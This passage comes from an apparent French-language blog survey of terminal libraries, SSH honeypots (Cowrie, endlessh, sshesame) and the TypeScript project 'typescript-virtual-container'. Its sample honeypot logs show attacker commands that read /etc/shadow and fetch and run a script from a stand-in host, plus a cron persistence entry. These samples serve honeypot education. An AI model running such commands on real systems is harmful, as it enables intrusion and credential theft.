Ce qui saute aux yeux dans ce tableau : `v86` est le seul qui est un package npm, qui tourne à la fois dans le navigateur et Node, et qui est open-source. C'est pour ça qu'il domine la conversation sur les "émulateurs Linux en JavaScript". Tout le reste a un inconvénient -- JSLinux n'a pas d'API, jor1k est archivé, CheerpX coûte de l'argent, WebContainers est navigateur-only et spécifique à Node, container2wasm nécessite une étape de build et un CLI. Si tu as juste besoin de "démarrer Linux en JavaScript", `v86` est presque toujours le bon point de départ.

---

## Partie 3 -- Les stacks terminal : xterm.js et node-pty

Deux packages reviennent constamment quand les gens construisent des expériences de type shell. Ce ne sont pas des bacs à sable ou des émulateurs -- ce sont la plomberie UI et PTY -- mais ils sont tellement connexes que je me sentirais mal de les laisser de côté. Aussi, je les ai utilisés tous les deux et ils sont vraiment bons.

### 3.1 `xterm.js` -- le rendu de terminal

xterm.js est un émulateur de terminal pour le navigateur. Il affiche un écran de terminal (séquences d'échappement VT100/xterm) dans un élément `<canvas>`, gère les entrées clavier, et expose une API pour acheminer les données.

Utilisé par : le terminal intégré de VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, et bien d'autres.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Envoyer des données au terminal (affiché comme texte)
term.write("$ ");
term.onData(data => {
  // data sont les frappes -- envoie à ton backend
  socket.send(data);
});
socket.onmessage(msg => {
  // sortie du backend -- affiche-la
  term.write(msg.data);
});
```

xterm.js est uniquement la couche de rendu. Il n'exécute pas de shell. Il n'interprète pas les commandes. C'est un widget d'affichage que tu connectes au backend de ton choix. Beaucoup de gens pensent que xterm.js "fait le terminal" mais c'est vraiment juste l'écran -- tu dois encore le connecter à quelque chose qui exécute réellement des commandes.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- création de PTY

`node-pty` crée un pseudoterminal (PTY) dans Node.js et te donne un handle de lecture/écriture dessus. Utilisé avec xterm.js, il permet de construire un terminal navigateur qui parle à un vrai shell (bash, zsh, fish) tournant sur le serveur.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Envoyer au navigateur xterm.js via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Transmettre les frappes du navigateur au shell
  shell.write(data);
});
```

C'est le schéma standard pour les IDE cloud et les terminaux web : xterm.js (navigateur) ↔ WebSocket ↔ node-pty ↔ vrai bash. Pas d'isolation. Le shell s'exécute avec toutes les permissions du processus Node.js (ou de l'utilisateur qui le lance).

**Maintenu par** : Microsoft.  
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Partie 4 -- Les honeypots SSH

Les honeypots sont conçus pour être attaqués. Le but est d'avoir l'air assez réel pour que les attaquants interagissent avec eux, tout en enregistrant tout ce qu'ils font pour le renseignement de menaces. SSH est la cible principale parce que c'est le service le plus attaqué sur internet -- si tu exposes le port 22 sur une IP publique, tu verras des tentatives de scan automatisées en quelques minutes littéralement. Essaye un jour, c'est assez horrifiant à quel point ça arrive vite.

La qualité d'un honeypot se mesure à deux choses : la **fidélité** (à quel point il imite de manière convaincante un vrai système) et la **télémétrie** (quelle quantité de données utiles il capture). Ces deux choses sont en tension. Un honeypot haute-fidélité est plus difficile à construire et plus risqué à opérer.

Cette section est ce qui m'a finalement conduit à construire le module `HoneyPot` dans `typescript-virtual-container`, donc j'ai quelques opinions ici.

### 4.1 Cowrie -- l'étalon-or

Cowrie est un honeypot SSH et Telnet à interaction moyenne-à-haute basé sur Python. C'est le honeypot SSH le plus déployé dans la communauté de la recherche et de la sécurité.

Architecture :
- **Couche protocole** : implémentation réelle du protocole SSH (Twisted Conch), donc les attaquants ont de vraies poignées de main, un vrai échange de clés, une vraie authentification
- **Couche shell** : un faux système de fichiers (ressemblant à Debian 5.0) et un interpréteur de shell partiel qui répond aux commandes courantes
- **Mode proxy** : peut rediriger vers un vrai système derrière (mode haute interaction), en enregistrant tout ce qui passe
- **Mode LLM** (ajout récent) : utilise un modèle de langage pour générer des réponses dynamiques aux commandes qu'il ne sait pas gérer -- oui, Cowrie a maintenant un mode IA. On vit une époque de fou.

```python
# Ce que Cowrie capture
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie sauvegarde les fichiers téléchargés (via wget/curl/SFTP/SCP) pour l'analyse de malwares. Il s'intègre avec Splunk, Elasticsearch, et d'autres plateformes SIEM.

**Fidélité** : moyenne-haute. Assez convaincant pour tromper les bots automatisés (ce qui représente 99% des attaquants SSH -- la plupart sont juste des scripts stupides qui essayent `root`/`password`). Des humains sophistiqués peuvent l'identifier par empreinte numérique cependant, généralement assez vite.

**Langage** : Python (Twisted)  
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- le prédécesseur de Cowrie

Kippo est le honeypot SSH à interaction moyenne original sur lequel Cowrie était basé. Même idée de base : vrai protocole SSH, faux système de fichiers, shell partiel. Cowrie l'a complètement supplanté à ce stade -- Kippo est archivé et personne ne devrait l'utiliser en 2026. Mentionné ici purement pour l'exhaustivité historique, puisque tu pourrais le voir référencé dans de vieux articles de blog et papiers de sécurité.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo) -- archivé

---

### 4.3 endlessh -- le tarpit SSH

endlessh est un honeypot dégénéré : il maintient les connexions SSH ouvertes en diffusant lentement les données de bannière à 1 octet par seconde (ou moins). Un client SSH qui s'y connecte va rester bloqué indéfiniment -- il n'arrivera jamais à l'authentification parce que le serveur ne finit jamais d'envoyer la bannière.

Le but n'est pas le renseignement de menaces mais le pur refus de ressource : occuper les threads de scan des attaquants pour qu'ils ne puissent pas atteindre les vraies cibles aussi vite. C'est honnêtement un peu diabolique dans le bon sens. Tu n'apprends rien de l'attaquant -- tu lui fais juste perdre son temps. Il y a quelque chose de profondément satisfaisant là-dedans.

```c
// Tout le comportement protocolaire d'endlessh :
// Envoyer : "SSH-2.0-OpenSSH_" puis ajouter lentement des caractères aléatoires
// Ne jamais fermer la connexion
// Le scanner de l'attaquant expire après N secondes
```

Aucune commande n'est capturée. Aucune authentification n'est testée. Juste du temps de connexion.

**Écrit en** : C  
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- le honeypot "laisse tout le monde entrer"

sshesame accepte toutes les connexions SSH (n'importe quel utilisateur, n'importe quel mot de passe, n'importe quelle clé) et enregistre tout. C'est un honeypot à zéro interaction : il ne répond pas aux commandes, il laisse juste les attaquants "entrer" et enregistre chaque frappe qu'ils tapent.

```
2024-01-15 03:22:11 Connexion de 45.33.32.156
  Utilisateur : root, Mot de passe : password123 -- accepté
  Commandes tapées :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Déconnecté après 47s
```

Utile pour la récolte d'identifiants : tu accumules rapidement les noms d'utilisateur et mots de passe que les bots essayent, ce qui te dit quels identifiants par défaut sont actuellement bruteforcés activement. Spoiler : c'est toujours `root`/`password`, `admin`/`admin`, et `root`/`123456`. À chaque fois.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework de honeypot basé sur Docker

`lyrebird/honeypot-base` est une image de base Docker pour construire des honeypots de services réseau. Ce n'est pas spécifiquement un honeypot SSH -- c'est un framework pour construire des honeypots pour n'importe quel protocole.

L'image de base fournit un framework de journalisation, un système de plugins pour les protocoles, et des configurations Docker Compose pour les honeypots multi-services. Tu l'étends pour simuler des services spécifiques.

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Construire un honeypot SSH en Node.js -- la méthode naïve, et pourquoi ça échoue

Avant `typescript-virtual-container`, construire un honeypot SSH en Node.js signifiait combiner la vraie bibliothèque `ssh2` avec une simulation manuelle de commandes. Très fastidieux, très incomplet, mais... c'est un passage obligé à ce stade :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Journaliser la tentative
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Laisser tout le monde entrer
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Réponse simulée
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Ça "marche" dans le sens où ça capture les identifiants et les commandes. Mais c'est évidemment faux dès qu'un attaquant sophistiqué creuse un peu. `uname -a` retourne la bonne chaîne mais `ls /etc` retourne "command not found" -- ça sent le piège à plein nez. Le système de fichiers n'existe pas. Les commandes ne s'enchaînent pas. Les pipes ne fonctionnent pas. Les variables ne s'expandent pas.

Un attaquant compétent identifiera ton honeypot dans les cinq premières commandes. Les scripts automatisés qui cherchent un comportement de type Cowrie le détecteront aussi immédiatement. C'est apparemment ce qui a poussé l'autrice de `typescript-virtual-container` à construire quelque chose qui interprète réellement les commandes pour de vrai -- plus sur ça dans la Partie 5.

---

### Résumé de la famille des honeypots

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naïf ssh2 |
|---|---|---|---|---|---|---|
| **Niveau d'interaction** | moyen-élevé | moyen | zéro | zéro | variable | faible |
| **Vrai protocole SSH** | ✅ | ✅ | ❌ (tarpit) | ✅ | variable | ✅ |
| **Fidélité du shell** | moyenne | moyenne | n/a | aucune | variable | minimale |
| **Capture les identifiants** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Capture les commandes** | ✅ | ✅ | ❌ | ✅ | variable | ✅ |
| **Capture les malwares** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Intégration SIEM** | ✅ native | ❌ | ❌ | ❌ | ❌ | manuelle |
| **Réponses LLM** | ✅ (nouveau) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Langage** | Python | Python | C | Go | Docker | Node.js |
| **Node.js natif** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Statut** | ✅ très actif | ⚠️ archivé | ✅ actif | ✅ actif | ✅ actif | DIY |

Le schéma ici est assez clair : plus tu veux de fidélité, plus tu dois écrire de Python. Cowrie est le vainqueur incontesté si tu fais ça sérieusement -- il a été éprouvé sur le terrain pendant des années et capture bien plus que de simples identifiants. endlessh et sshesame sont des projets sympas plus que des outils sérieux de renseignement de menaces. Et l'approche naïve en Node.js t'amène peut-être à 20% du chemin avant que tu ne cognes un mur.

---

## Partie 5 -- `typescript-virtual-container` : ce qui comble le fossé

OK alors là les choses deviennent intéressantes. Après avoir catalogué toutes les familles ci-dessus, le quadrant manquant devient assez évident :

- Les bacs à sable JS : isolent le code, pas de shell, pas de système de fichiers, pas de SSH
- Les émulateurs Linux : vrai OS, vrai shell, vrai SSH... mais 150+ Mo de RAM, 30 secondes de démarrage, et tu dois construire ta propre API par-dessus les E/S série
- Les honeypots : faux shell, pas d'API programmable, Python/Go/C, pas natif Node

Personne n'avait construit un environnement Linux complet, programmable, natif Node, avec du vrai SSH, de vraies permissions, un vrai réseau virtuel, et une API TypeScript typée. Alors elle l'a construit.

Petite introduction puisque c'est la première fois que je la mentionne correctement : `typescript-virtual-container` a été construit par [Chloé Rolzhausen](https://itsrealfortune.fr), une développeuse française qui se fait appeler **Fortune** (ou ItsRealFortune) en ligne. Tu peux la trouver sur son [site web](https://itsrealfortune.fr) et sur [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Tout le projet -- 56 000 lignes de TypeScript, 247 fichiers, 170 commandes -- a été un effort en solo par une seule personne. Je l'appellerai Fortune pour le reste de l'article. Et oui, c'est assez fou. Va jeter un œil à son travail !

### Ce que c'est réellement

`typescript-virtual-container` est un **simulateur d'environnement Linux** écrit en TypeScript pur. Pas de Wasm. Pas d'extensions natives. Pas de noyau. ~56 000 lignes de source réparties sur 247 fichiers TypeScript.

La perspicacité clé : tu n'as pas besoin d'un émulateur CPU pour faire fonctionner `ls /etc | grep passwd`. Tu as besoin de :
1. Un arbre de nœuds en mémoire qui répondent aux opérations de chemin
2. Un modèle de permissions POSIX appliqué à chaque accès
3. Un analyseur syntaxique de shell qui comprend les pipelines, les redirections, les sous-shells et l'expansion de variables
4. ~170 implémentations de commandes (des fonctions, pas des binaires)
5. Un système de gestion des utilisateurs et des groupes
6. Quelque chose pour exposer tout ça via SSH

Tout ça est réalisable en TypeScript pur sans aucune implication du noyau.

### Le VirtualFileSystem

Le VFS est un arbre en mémoire de nœuds typés -- pas d'E/S disque sauf si tu actives explicitement le mode de persistance `"fs"` :

```ts
// Représentation interne simplifiée
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder chargé paresseusement
```

Chaque opération de chemin passe par `normalizePath` (résout `.`, `..`, les liens symboliques) et `enforceAccess` (vérifie les permissions lecture/écriture/exécution par rapport à l'uid/gid demandeur). `chmod`, `chown`, les sticky bits et setuid sont tous implémentés et réellement appliqués. Si un processus tournant en tant que uid 1000 essaye de lire un fichier appartenant à root avec le mode 0600, il obtient EACCES -- pas un faux EACCES, une vraie `Error` JavaScript lancée depuis la vérification de permission. Cette partie est assez élégante honnêtement.

Le VFS se sérialise en :
- `.vfsb` -- un format binaire compact (personnalisé, avec compression fflate) -- c'est le format par défaut
- Instantané JSON -- lisible par l'humain, bon pour le débogage
- Archive TAR -- import/export avec le vrai format tar, donc tu peux `tar -xf` quelque chose et le VFS a juste... ces fichiers
- Image SquashFS -- import en lecture seule

En mode de persistance `"fs"`, il maintient un journal d'écriture anticipée (WAL) pour la récupération après crash -- les écritures vont d'abord dans le journal, puis dans l'instantané lors du flush. Si Node plante au milieu d'une opération, le journal te permet de reconstruire le dernier état complet.

Il y a aussi une couche `FileCache` qui simule la latence des E/S disque. Tu configures des profils comme `NVME_DISK_IO` ou `HDD_DISK_IO` et le VFS retarde artificiellement les opérations sur les fichiers pour correspondre à des temporisations réalistes. Ce qui est assez drôle -- un logiciel qui se ralentit intentionnellement pour simuler du matériel -- mais en fait très utile pour le benchmarking.

### L'interpréteur de shell

L'analyseur syntaxique du shell produit un AST typé :

```ts
// "ls /etc | grep root && echo done" s'analyse en :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

L'exécuteur parcourt cet AST :
- Pour un pipeline, il crée une chaîne de flux `{ stdin, stdout, stderr }` et exécute chaque commande avec des E/S pipelined
- Pour les opérateurs logiques (`&&`, `||`), il vérifie `$?` après le côté gauche avant d'exécuter le droit
- Pour les sous-shells (`$(...)`, `` ` ` ``), il bifurque le contexte d'exécution
- Pour les redirections (`>fichier`, `>>fichier`, `2>&1`, `<fichier`), il configure le câblage des flux avant l'exécution
- Pour les tâches d'arrière-plan (`cmd &`), il s'exécute sans attendre la fin
- Pour les variables, il expande `$VAR`, `${VAR:-default}`, `${#VAR}`, et l'arithmétique `$((expr))`
- Pour l'expansion d'accolades (`{a,b,c}`, `{1..5}`), il génère la liste d'expansion complète avant d'exécuter

Tout ça est un vrai comportement POSIX shell. L'analyseur gère les heredocs, la substitution de processus, le globbing (`*`, `?`, `[abc]`), et la gestion des guillemets (guillemets simples, guillemets doubles avec interpolation, échappement par antislash). Ce n'est pas parfait -- des cas limites existent -- mais c'est bien au-delà de ce à quoi tu t'attendrais de la part d'un projet TypeScript.

### ~170 commandes intégrées

Les commandes sont des fonctions TypeScript enregistrées dans un registre de commandes. Elles reçoivent un `CommandContext` avec les flux stdin/stdout/stderr, le VFS, la session utilisateur, l'environnement du shell, et l'accès aux sous-modules.

Écrire 170 implémentations de commandes Unix, c'est... beaucoup. Certaines sont triviales (`echo`, `true`, `false`), certaines sont étonnamment complexes (`awk`, `find`, `tar`). Genre, un `awk` POSIX complet ? En TypeScript ? C'est fou honnêtement. Voici un échantillon de ce qu'il y a dedans :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (côté client, connexion sortante),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (éditeur interactif complet), vim (basique), vi (basique),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulé), systemctl (stub), journalctl (stub),
...et environ 130 autres
```

Les "stubs" (git, python3, node) répondent de manière réaliste aux invocations courantes -- `python3 --version` retourne une chaîne de version crédible, `git status` montre un état de dépôt fictif -- sans faire de vrai travail. Pour un honeypot, ce sont en fait plus utiles que les vraies commandes, parce qu'elles te permettent d'observer ce que les attaquants essaient d'exécuter sans rien exécuter de dangereux.

### Le serveur SSH

La couche SSH utilise le vrai package npm `ssh2` -- vrai protocole SSH, vrai échange de clés, vrai chiffrement. `SSHMimic` l'enveloppe :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Vrai SSH : ssh -p 2222 root@localhost
// Vrai SFTP : sftp -P 2222 root@localhost
// Vrai SCP : scp -P 2222 file root@localhost:/tmp/
```

Les `shellProperties` déterminent ce que `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, et `/etc/os-release` rapportent. Tu peux imiter n'importe quelle distribution Linux et version de noyau de manière convaincante -- pour un vrai client SSH, il n'y a littéralement aucun moyen de faire la différence.

### Le module HoneyPot

Parce que l'interpréteur de shell est réel et que le serveur SSH est réel, les commandes des attaquants s'exécutent réellement dans l'environnement virtuel. Les requêtes `wget` déclenchées par l'attaquant sont journalisées avec les URL de destination. Les fichiers créés par l'attaquant sont sauvegardés dans le VFS. Les tentatives d'escalade de privilèges de l'attaquant produisent des erreurs réalistes.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Après une session, différencier le système de fichiers
const before = shell.vfs.toSnapshot();
// ... session de l'attaquant ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

C'est qualitativement différent de Cowrie. Le faux système de fichiers de Cowrie peut répondre à `ls` mais ne peut pas réellement suivre les fichiers qu'un attaquant a créés et les modifications qu'il a apportées sous forme de diff structuré. `typescript-virtual-container` le peut, parce que le VFS est une structure de données vivante -- chaque écriture est suivie. Cette entrée cron que l'attaquant vient d'ajouter ? Elle est dans le diff. Ce dossier `.hidden` ? Dans le diff. Plutôt utile pour l'analyse de malwares.

### La pile réseau virtuelle

C'est probablement la partie la plus impressionnante de tout le projet, et elle n'a pas d'équivalent dans aucun autre projet de cet espace. Genre, une pile réseau virtuelle L2/L3 complète avec support VPN, écrite en TypeScript pur, sans aucune carte réseau réelle impliquée. C'est vraiment fou.

`VirtualNetworkManager` donne à chaque instance `VirtualShell` des interfaces réseau virtuelles avec des adresses IP configurables, des tables de routage, et un pare-feu logiciel (règles de style iptables avec conntrack et NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` montrent tous l'état du réseau virtuel.

`VirtualSwitch` (nommé Baie -- du mot français pour baie de serveur, "baie informatique") connecte plusieurs shells sur un sous-réseau partagé. Il implémente :
- Apprentissage MAC et ARP
- Routage IP entre sous-réseaux
- NAT (masquerade sortante)
- DNS (enregistrements configurables par sous-réseau)
- Équilibrage de charge (round-robin, moindre connexions)
- Façonnage du trafic : latence, gigue (distribution gaussienne), perte de paquets, perte par salves, réordonnancement, duplication
- Limitation de bande passante (seau à jetons)
- Application MTU
- Suivi de connexion (avec état, états NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Trois machines virtuelles sur le même commutateur
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Pare-feu : web peut atteindre api, api peut atteindre db, web ne peut pas atteindre db directement
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Façonnage du trafic : simuler une liaison WAN instable vers l'extérieur
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` crée des tunnels chiffrés entre instances de Baie -- tu peux simuler un réseau multi-site avec des interconnexions VPN entre sites.

`VirtualProxy` implémente le forwarding de ports et un proxy SOCKS5.

Rien de tout ça ne touche à une vraie carte réseau. C'est tout du routage d'objets TypeScript. La commande `ping` "marche" en routant via le commutateur virtuel et en retournant des réponses ICMP simulées. `curl http://192.168.0.3/api` route via le réseau virtuel, atteint la réponse HTTP simulée du shell api, et retourne le contenu. C'est des tortues jusqu'en bas, dans le meilleur sens possible.

### Le `SandboxedShell`

Pour une utilisation programmatique où tu as besoin d'une isolation plus forte, `SandboxedShell` exécute une session shell dans un thread Worker Node.js :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% d'un cœur
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

L'isolation ici est assurée par la couche VFS (le shell du thread worker ne peut voir que le système de fichiers virtuel, jamais le système de fichiers hôte) plus l'isolation mémoire du thread Worker Node.js. C'est plus léger que `isolated-vm` mais plus approprié pour une isolation au niveau shell plutôt qu'au niveau JS.

### Plafonnement des ressources

Tu peux configurer des limites de ressources par shell qui affectent ce que les commandes de monitoring système rapportent :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

À l'intérieur de ce shell, `free -m` montre 512 Mo de RAM totale. `nproc` retourne 2. `/proc/meminfo` montre les valeurs plafonnées. `htop` et `top` montrent le nombre de CPU plafonné. Ça te permet de définir précisément l'empreinte matérielle de la machine simulée.

### Trois modes de déploiement

```
Mode 1 : Serveur SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Vrai protocole SSH, vrai SFTP, vrai SCP
  → Cas d'usage : honeypots, environnements de test distants, laboratoires de formation

Mode 2 : Shell web (navigateur)
  builds/fortune-nyx-v1.7.6-web.min.js (bundle ESM)
  → Tourne dans le navigateur, VFS persisté dans IndexedDB
  → Cas d'usage : tutoriels interactifs, terminaux embarqués, démos
  → Bonus : exécute startxfce4 pour un bureau XFCE complet simulé

Mode 3 : CLI autonome
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (un seul fichier, pas d'installation)
  → curl et exécute, persisté le VFS dans le répertoire .vfs/
  → Cas d'usage : démos rapides, expérimentation locale
```

### Les polyfills -- comment le build navigateur fonctionne sans Wasm

OK c'est la partie que je trouve vraiment intelligente et que je voulais souligner spécialement.

Faire fonctionner une bibliothèque Node.js dans le navigateur est généralement un cauchemar. Soit tu utilises un runtime Wasm (lourd, lent à charger), soit tu passes des semaines à remplacer manuellement chaque import `node:*` par une alternative compatible navigateur. Fortune a fait la deuxième chose -- mais très proprement, en écrivant un ensemble de polyfills personnalisés qui vivent dans le répertoire `polyfills/` du dépôt.

La pipeline de build est juste esbuild avec un tas d'entrées `alias` :

```js
// demo/build.js -- toute la config du build navigateur
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Pas de Wasm. Pas de bibliothèque de polyfills externe. Pas de trucs `webpack-node-externals`. Juste des modules aliasés et quelques globales injectées. Laisse-moi détailler chacun parce que certains sont vraiment impressionnants.

**`node:fs` -- IndexedDB comme faux système de fichiers**

Celui-ci est mon préféré. Le polyfill `node:fs` implémente l'API synchrone Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) soutenue par deux couches : une `Map` en mémoire pour les lectures synchrones, et IndexedDB pour la persistance entre les rechargements de page. Les écritures vont dans la Map immédiatement (donc `readFileSync` juste après `writeFileSync` fonctionne toujours), puis sont vidées vers IndexedDB de manière asynchrone en arrière-plan.

```js
// Cache synchrone (chemin → Uint8Array | null) -- lectures instantanées
const memCache = new Map();

// Précharger tout depuis IndexedDB dans memCache au démarrage
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

C'est la raison pour laquelle l'instantané VFS survit aux rechargements de page dans le navigateur -- le binaire `.vfsb` entier est écrit dans IndexedDB via ce polyfill, et relu au chargement suivant. Pas de Wasm. Pas de serveur. Juste IndexedDB, qui est dans tous les navigateurs depuis genre 2011.

**`node:crypto` -- SHA-256 en JS pur**

Au lieu d'importer une bibliothèque crypto Wasm, le polyfill crypto implémente SHA-256 depuis zéro en utilisant les constantes de tour FIPS 180-4. 166 lignes de JS pur avec support complet des sorties hex/base64/Uint8Array. Tout le hachage dans la bibliothèque passe par là -- l'empreinte des clés hôtes SSH, les sommes de contrôle internes, tout. Compact, zéro dépendance, ça marche.

**`node:os` -- lit le vrai matériel du navigateur**

Celle-ci est une belle attention. Au lieu de retourner des valeurs fictives codées en dur, `node:os` lit `navigator.deviceMemory` pour la RAM totale et `navigator.hardwareConcurrency` pour le nombre de CPU. Donc `neofetch` dans le build navigateur rapporte en fait quelque chose qui correspond à ta vraie machine -- pas un stub bidon `2 cœurs, 2 Go de RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 Go par défaut
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // analyse aussi navigator.userAgent pour deviner la chaîne du modèle CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- des stubs honnêtes**

Le navigateur ne peut pas ouvrir de sockets TCP ou exécuter du vrai SSH, donc ce sont des stubs qui lancent une erreur `NotImplemented` avec un message clair si quelque chose essaye de les utiliser. Pas d'échec silencieux, pas de `undefined` retourné là où un objet est attendu. Juste un message fort et clair "ça ne marche pas dans le navigateur" -- ce qui est exactement ce que tu veux.

**`process.js` et `buffer.js` -- des globales injectées**

